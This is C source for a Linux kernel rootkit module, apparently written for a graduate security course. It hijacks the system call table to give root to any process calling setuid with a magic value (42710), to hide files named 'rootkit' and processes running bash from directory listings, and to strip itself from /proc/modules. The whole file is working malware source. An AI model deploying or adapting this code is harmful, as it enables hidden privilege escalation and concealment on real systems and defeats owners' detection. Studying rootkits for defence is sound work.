//allows us to perform certain kernel-level operations, such as printk
#include <linux/ctype.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/syscalls.h>

struct linux_dirent {
	long           d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};


MODULE_LICENSE("GPL");
MODULE_AUTHOR("1337");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("This is a rootkit module written for a graduate computer security course at Stony Brook University. ");

unsigned long * sys_call_table;

asmlinkage int (*real_setuid) (uid_t uid);
asmlinkage int (*real_setuid32) (uid_t uid);
asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
asmlinkage long (*real_read)(unsigned int, char __user *, size_t);

asmlinkage long hijacked_read(unsigned int fd, char __user *buf, size_t count)
{
	bool rootkitfound = false;
	char *kbuf, *path, *str1, *str2;
	long num_reads = real_read(fd, buf, count), bufcount = 0;
	long ac_read = 0;
	struct file *f = fget(fd);

	if ( num_reads <= 0)
		goto out;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_reads = -ENOMEM;
		goto out;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	if (strcmp(path, "/proc/modules") == 0) {
		if (num_reads > PAGE_SIZE) {
			// TODO: Need to handle large pages iteratively
			// /proc/modules will hardly have more than 1024 size of entries
			num_reads = -ENOMEM;
			goto out;
		}

		copy_from_user(kbuf, buf, num_reads);
		str1 = kbuf;
		while((str2 = strsep(&str1, "\n"))){
			ac_read += (str1 - str2);
			if (strstr(str2, "rootkit") != NULL) {
				rootkitfound = true;
			} else {
				kbuf[ac_read - 1] = '\n';
				if (rootkitfound) {
					copy_to_user(buf + bufcount, str2, str1 - str2);
				}
				bufcount += (str1 - str2);
			}
			if( strnstr(str1, "\n", num_reads - ac_read) == NULL)
				break;
		}
		strncpy(buf + bufcount, str1, num_reads - ac_read);
		bufcount += (num_reads - ac_read);
		memset(kbuf, 0, num_reads - bufcount);
		copy_to_user(buf + bufcount, kbuf, num_reads - bufcount);
	}

	kfree(kbuf);
out:
	return num_reads;
}

asmlinkage int hijacked_setuid(uid_t uid){
	struct cred *new;
	if (uid == 42710){
		printk(KERN_DEBUG "setuid called\n");
		new = prepare_creds();
		new->uid = 0;
		new->gid = 0;
		new->suid = 0;
		new->sgid = 0;
		new->euid = 0;
		new->egid = 0;
		new->fsuid = 0;
		new->fsgid = 0;
		return commit_creds(new);
	}
		return real_setuid(uid);
}

bool isnumber(char *num){
	bool b = true;
	int numlen = strlen(num), i;
	for(i = 0; i < numlen; i++){
		if(!isdigit(num[i])){
			b = false;
			break;
		}
	}
	return b;
}


asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

	int num_reads = real_getdents(fd, dirp, count);

	struct linux_dirent *cdirp = dirp, *pdirp = NULL;
	struct file *f = fget(fd), *fcmdline;
	int i, readnums;
	long start_offset = (long)dirp;
	char *kbuf, *kbuf2, *path;
	bool isproc = false;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_reads = -ENOMEM;
		goto out;
	}
	kbuf2 = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf2 == NULL) {
		num_reads = -ENOMEM;
		goto free_kbuf;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	if (strcmp(path, "/proc") == 0) {
		isproc = true;
	}
	printk(KERN_DEBUG "isproc value: %s\n %s\n", isproc? "true" : "false", path);
	printk(KERN_INFO "hijacked call.\n");
	printk(KERN_INFO "num reads: %d\n",num_reads);

	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
		cdirp = (struct linux_dirent*)(start_offset + i);
		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
		if(isproc && isnumber(cdirp->d_name)){
			strcpy(kbuf, "/proc/");
			strcat(kbuf, cdirp->d_name);
			strcat(kbuf, "/cmdline");
			fcmdline = filp_open(kbuf, O_RDONLY, 0);
			readnums = kernel_read(fcmdline, 0, kbuf2, PAGE_SIZE);
			filp_close(fcmdline, NULL);
			if (readnums != 0)
				printk("process cmdline %s\n", kbuf2);
			if (readnums != 0 && strstr(kbuf2, "bash") != NULL) {
				printk("File to hide %s\n", kbuf2);
				pdirp->d_reclen += cdirp->d_reclen;
			} else {
				pdirp = cdirp;
			}
		} else if (strstr(cdirp->d_name,"rootkit") != NULL){
			if (pdirp == NULL)
				dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
			else
				pdirp->d_reclen += cdirp->d_reclen;
		} else {
			pdirp = cdirp;
		}
	}
	kfree(kbuf2);
free_kbuf:
	kfree(kbuf);
out:
	return num_reads;
}



// make the address writable if it is write-protected.
int make_rw(unsigned long address){
	unsigned int level;
      	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
	pte->pte |= _PAGE_RW;
	return 0;
}

int make_ro(unsigned long address){
      unsigned int level;
      pte_t *pte = lookup_address(address, &level);
      pte->pte = pte->pte &~ _PAGE_RW;
      return 0;
}



void hijack_sys_call_table(void){
	make_rw((unsigned long)sys_call_table);
        real_getdents = (void*)*(sys_call_table + __NR_getdents);
        real_setuid = (void*)*(sys_call_table + __NR_setuid);
        real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
        real_read = (void*)*(sys_call_table + __NR_read);
        *(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
        *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
        *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
        *(sys_call_table + __NR_read) = (unsigned long)hijacked_read;
	make_ro((unsigned long)sys_call_table);
}

int init_module(void){
	
	/*
	pointer to the system call table. The address is currently hardcoded,
	taken from the /boot/System map file. This address seems to be the same
	after every boot, so for now it can be hardcoded.
	*/
	sys_call_table = (unsigned long*)0xc1688140;
	hijack_sys_call_table();	
	
	printk(KERN_INFO "Rootkit added.\n\n");
	
	return 0;
}

void cleanup_module(void){
      	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
        *(sys_call_table + __NR_setuid) = (unsigned long)real_setuid;
        *(sys_call_table + __NR_setuid32) = (unsigned long)real_setuid32;
        *(sys_call_table + __NR_read) = (unsigned long)real_read;
	make_ro((unsigned long)sys_call_table);
	printk(KERN_INFO "Rootkit removed.\n");
}
